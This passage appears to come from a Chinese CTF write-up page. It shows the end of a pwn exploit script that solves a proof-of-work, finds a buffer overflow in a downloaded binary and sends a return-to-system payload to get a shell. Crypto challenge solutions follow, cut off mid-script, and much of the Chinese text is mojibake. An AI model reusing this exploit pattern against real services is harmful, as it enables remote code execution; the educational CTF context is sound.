</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=n>solve_math</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=n>should_match</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>v</span> <span class=o>=</span> <span class=s1>&#39; &#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>x</span><span class=p>)</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>ret</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;solve math:&#39;</span><span class=p>,</span> <span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>v</span> <span class=o>+</span> <span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>block</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>opcode</span> <span class=o>==</span> <span class=s1>&#39;test&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>choice</span> <span class=ow>in</span> <span class=n>ins</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jz&#39;</span><span class=p>,</span> <span class=s1>&#39;je&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jnz&#39;</span><span class=p>,</span> <span class=s1>&#39;jne&#39;</span><span class=p>],</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jz&#39;</span><span class=p>,</span> <span class=s1>&#39;je&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>assert</span> <span class=n>ins</span><span class=o>.</span><span class=n>opcode</span> <span class=ow>in</span> <span class=p>[</span><span class=s1>&#39;jnz&#39;</span><span class=p>,</span> <span class=s1>&#39;jne&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=n>should_match</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=n>solve_array</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=n>should_match</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;solve array:&#39;</span><span class=p>,</span> <span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>block</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s1>&#39;not possible&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;next block entry: </span><span class=si>%s</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=n>ins</span><span class=o>.</span><span class=n>choice</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>block</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>=</span> <span class=n>ins</span><span class=o>.</span><span class=n>choice</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>LOCAL</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;./bin.patched&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;TARGET&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ary</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s1>&#39;TARGET&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=p>(</span><span class=n>ary</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=nb>int</span><span class=p>(</span><span class=n>ary</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>LOCAL</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>suffix</span><span class=p>,</span> <span class=n>hsh</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>hsh</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>hsh</span> <span class=o>=</span> <span class=n>hsh</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>suffix</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>suffix</span> <span class=o>=</span> <span class=n>suffix</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;hashcat&#39;</span><span class=p>,</span> <span class=s1>&#39;--potfile-disable&#39;</span><span class=p>,</span> <span class=s1>&#39;--quiet&#39;</span><span class=p>,</span> <span class=s1>&#39;--outfile-format&#39;</span><span class=p>,</span> <span class=s1>&#39;2&#39;</span><span class=p>,</span> <span class=s1>&#39;-a&#39;</span><span class=p>,</span> <span class=s1>&#39;3&#39;</span><span class=p>,</span> <span class=s1>&#39;-m1400&#39;</span><span class=p>,</span> <span class=n>hsh</span><span class=o>.</span><span class=n>strip</span><span class=p>(),</span> <span class=s1>&#39;?a?a?a?a&#39;</span> <span class=o>+</span> <span class=n>suffix</span><span class=o>.</span><span class=n>strip</span><span class=p>()]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pio</span> <span class=o>=</span> <span class=n>zio</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>pio</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pio</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>x</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;target = </span><span class=si>%r</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>zio</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=n>print_read</span><span class=o>=</span><span class=n>COLORED</span><span class=p>(</span><span class=n>RAW</span><span class=p>,</span> <span class=s1>&#39;yellow&#39;</span><span class=p>),</span> <span class=n>print_write</span><span class=o>=</span><span class=n>COLORED</span><span class=p>(</span><span class=n>RAW</span><span class=p>,</span> <span class=s1>&#39;cyan&#39;</span><span class=p>),</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>LOCAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>gdb_hint</span><span class=p>(</span><span class=n>breakpoints</span><span class=o>=</span><span class=p>[</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=mh>0x40141F</span><span class=p>,</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bin_content</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>target</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>instructions</span><span class=p>,</span> <span class=n>mapping</span><span class=p>,</span> <span class=n>reverse_map</span> <span class=o>=</span> <span class=n>load_disasm</span><span class=p>(</span><span class=s1>&#39;disasm.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;sha256(xxxx + &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>suffix</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;) == &#39;</span><span class=p>,</span> <span class=n>keep</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>hsh</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>read_line</span><span class=p>(</span><span class=n>keep</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ans</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>suffix</span><span class=p>,</span> <span class=n>hsh</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;give me xxxx:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>writeline</span><span class=p>(</span><span class=n>ans</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b64</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>read_until</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;==end==&#39;</span><span class=p>,</span> <span class=n>keep</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bin_content</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>b64</span><span class=o>.</span><span class=n>strip</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;bin.tmp&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>bin_content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;bin.tmp.disasm.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>proc</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s1>&#39;objdump&#39;</span><span class=p>,</span> <span class=s1>&#39;-M&#39;</span><span class=p>,</span> <span class=s1>&#39;intel&#39;</span><span class=p>,</span>  <span class=s1>&#39;-d&#39;</span><span class=p>,</span> <span class=s1>&#39;./bin.tmp&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>f</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>instructions</span><span class=p>,</span> <span class=n>mapping</span><span class=p>,</span> <span class=n>reverse_map</span> <span class=o>=</span> <span class=n>load_disasm</span><span class=p>(</span><span class=s1>&#39;bin.tmp.disasm.txt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>idx</span><span class=p>,</span> <span class=n>overflow_offset</span><span class=p>,</span> <span class=n>overflow_size</span> <span class=o>=</span> <span class=n>find_overflow</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>instructions</span><span class=p>[</span><span class=n>idx</span><span class=o>-</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>instructions</span><span class=p>[</span><span class=n>idx</span><span class=o>-</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>instructions</span><span class=p>[</span><span class=n>idx</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>instructions</span><span class=p>[</span><span class=n>idx</span><span class=o>-</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>find_path</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>walk</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ret</span> <span class=o>=</span> <span class=mh>0x401379</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>system</span> <span class=o>=</span> <span class=mh>0x40134C</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>l64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>*</span> <span class=p>((</span><span class=n>overflow_offset</span> <span class=o>//</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>l64</span><span class=p>(</span><span class=n>ret</span><span class=p>)</span> <span class=o>+</span> <span class=n>l64</span><span class=p>(</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>overflow_size</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;_&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interact</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=crypto>Crypto</h1><h3 id=ciruit-map>ciruit map</h3><p>æè¿°ï¼š</p><p>A valid map</p><p>Digital circuits is hard , right?</p><p><a href=https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/>https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/</a> 2021dicectfåŸé¢˜</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor</span><span class=p>(</span><span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>a</span> <span class=o>^</span> <span class=n>b</span> <span class=k>for</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>A</span><span class=p>,</span> <span class=n>B</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>input</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>13675268</span><span class=p>,</span> <span class=mi>8343801</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>12870274</span><span class=p>,</span> <span class=mi>10251687</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>12490757</span><span class=p>,</span> <span class=mi>6827786</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>3391233</span><span class=p>,</span> <span class=mi>2096572</span><span class=p>],</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>4567418</span><span class=p>,</span> <span class=mi>15707475</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>3648155</span><span class=p>,</span> <span class=mi>14095476</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>8680011</span><span class=p>,</span> <span class=mi>14409690</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mi>2504390</span><span class=p>,</span> <span class=mi>9376523</span><span class=p>]</span>  <span class=c1>#å…ˆæ±‚å‡ºçš„key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>xor1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>input</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>xor1</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>tmp</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mask</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>xor1</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=mh>0x1661fe85c7b01b3db1d432ad3c5ac83a</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>xor</span><span class=p>(</span><span class=n>mask</span><span class=p>,</span> <span class=n>flag</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=cubic>cubic</h3><p>nc 123.60.153.41 7002</p><p>A valid cubic</p><p>ç»å…¸çš„è‡ªå®šä¹‰ç¾¤è¿ç®—é¢˜ç›®ï¼Œå¾ˆæ˜¾ç„¶è¿™æ˜¯ä¸€ä¸ªæœ‰é™ç¾¤ï¼Œæ‰€ä»¥å…¶å•†ç¾¤å¿…ç„¶å­˜åœ¨å¾ªç¯ç¾¤ã€‚æ ¹æ®æ¬§æ‹‰å®šç†çš„è¯æ˜å¯ä»¥å¾—å‡ºï¼Œæ¬§æ‹‰å®šç†é€‚ç”¨çš„æ¡ä»¶æ˜¯å¾ªç¯ç¾¤ï¼Œå› æ­¤è¯¥é¢˜ç›®å®šä¹‰çš„ç¾¤æ˜¯ç¬¦åˆæ¬§æ‹‰å®šç†çš„ã€‚RSAä¹Ÿæ˜¯åŸºäºæ¬§æ‹‰å®šç†ï¼Œæ‰€ä»¥è¿™é“é¢˜å’ŒRSAçš„è§£æ³•å¾ˆåƒã€‚</p><p>ç°åœ¨çš„å…³é”®é—®é¢˜æ˜¯å¯»æ‰¾ä¸€ç§æ–¹æ³•æ±‚ç¾¤ä¸Šå…ƒç´ çš„é˜¶ï¼Œè¿™æ˜¯åº”ç”¨æ¬§æ‹‰å®šç†çš„å…³é”®æ•°æ®ã€‚è§‚å¯Ÿä»£ç å¯ä»¥çœ‹å‡ºè¿™ä¸ªç¾¤çš„å•ä½å…ƒæ˜¯<code>(None, None)</code>ï¼Œæˆ‘ä»¬ä¸å¦¨æ‰“ä¸ªè¡¨æ¥æ‰¾ä¸€ä¸‹è§„å¾‹ï¼Œç”¨ä¸‹é¢çš„è„šæœ¬ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
